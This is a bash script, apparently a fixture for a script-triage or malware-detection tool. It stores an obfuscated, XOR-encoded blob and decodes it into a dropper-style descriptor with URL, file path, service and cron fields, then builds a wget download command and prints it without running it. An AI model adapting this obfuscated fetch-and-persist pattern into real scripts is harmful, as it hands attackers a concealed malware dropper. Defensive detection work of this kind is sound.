#!/usr/bin/env bash
  # Huntress Script Triage -- inert static-analysis fixture (bash_linux)
  readonly Material_0dacec61='%d2%ef%de%a2%d1%a5%c0%b0%c3%fe%9f%fc%8d%f8%91%e3%86%d9%ab%ce%a3%cc%b8%dd%f1%86%f4%9d%e9%8c%d3%b5%dc%b0%d5%a9%c8%ac%cd%bd%c9%ac%de%e3%94%f3%96%e2%bd%d2%a7%d3%a3%d6%a2%de%ad%d9%b8%df%ba%e5%86%e9%9c%f2%86%bb%8a%f6%95%f4%99%e9%88%e1%86%e8%b7%de%ba%87%e4%85%e8%98%f9%90%f7%99%b4%86%e2%d1%e7%85%e4%81%b1%83%e0%9c%e9%9b%f7%ca%a2%d6%a2%d2%a1%9b%b4%9b%a9%cd%fe%c8%aa%cb%ae%9e%ac%cf%e1%84%fc%9d%f0%80%ec%89%a7%ce%a0%d6%b7%db%b2%d6%f9%c1%a7%96%a7%c1%a4%c7%a5%8b%f8%90%ec%99%ea%8f%fd%a2%c3%a4%c1%af%db%e6%ae%db%b5%c1%b3%d6%a5%d6%9a%fb%99%b6%84%e0%d3%e5%87%e6%83%b3%81%e2%9e%f8%91%fd%98%c7%b7%d6%a2%ca%f7%d8%ac%c1%b1%9e%f6%83%ed%99%eb%8e%fd%8e%a3%c0%a1%c2%aa%cf%e0%ce%bd%c9%a8%cf%aa%87%b5%d1%e2%d4%b6%d7%b2%82%b0%d3'
  readonly Codec_0dacec61='percent_hex|rolling_xor|a4'

  Load_0dacec61() {
    EnCoDeD_Bytes=()
    local raw="${Material_0dacec61}" PaRt
    for PaRt in ${raw//%/ }; do [[ -n "$PaRt" ]] && EnCoDeD_Bytes+=("$((16#$PaRt))"); done
  }

  Decode_0dacec61() {
    DeCoDeD_Bytes=()
    local PrEvIoUs=164
    local InDeX
    for ((InDeX=0; InDeX<${#EnCoDeD_Bytes[@]}; InDeX++)); do
      DeCoDeD_Bytes+=("$((EnCoDeD_Bytes[InDeX] ^ PrEvIoUs))")
      PrEvIoUs=${EnCoDeD_Bytes[InDeX]}
    done
  }

  Recover_0dacec61() {
    local -a EnCoDeD_Bytes DeCoDeD_Bytes
    local DeScRiPtOr_Text NeUtRaL PaSs InDeX
    if ((2 > 1)); then NeUtRaL=left; else NeUtRaL=right; fi
    Load_0dacec61
    for PaSs in 1; do Decode_0dacec61; done
    DeScRiPtOr_Text=''
    local octal character
    for InDeX in "${!DeCoDeD_Bytes[@]}"; do
      printf -v octal '%03o' "${DeCoDeD_Bytes[InDeX]}"
      printf -v character '%b' "\\$octal"
      DeScRiPtOr_Text+="$character"
    done
    printf '%s\n' "$DeScRiPtOr_Text"
  }

  Inspect_0dacec61() { local recovered; recovered="$(Recover_0dacec61)"; printf '%s\n' "$recovered"; }

  Plan_0dacec61() {
    local descriptor field key value campaign_id='' url='' user_agent='' file_path='' arch_probe='' service_name='' cron_path=''
    descriptor="$(Inspect_0dacec61)"
    local -a fields
    IFS='|' read -r -a fields <<< "$descriptor"
    for field in "${fields[@]}"; do key=${field%%=*}; value=${field#*=}; case "$key" in campaign_id|url|user_agent|file_path|arch_probe|service_name|cron_path) printf -v "$key" '%s' "$value" ;; esac; done
    local -a request_command=(wget -qO "$file_path" "$url")
    declare -p request_command
  }

  if [[ ${HUNTRESS_INSPECT_ONLY:-0} == 1 ]]; then Inspect_0dacec61; fi
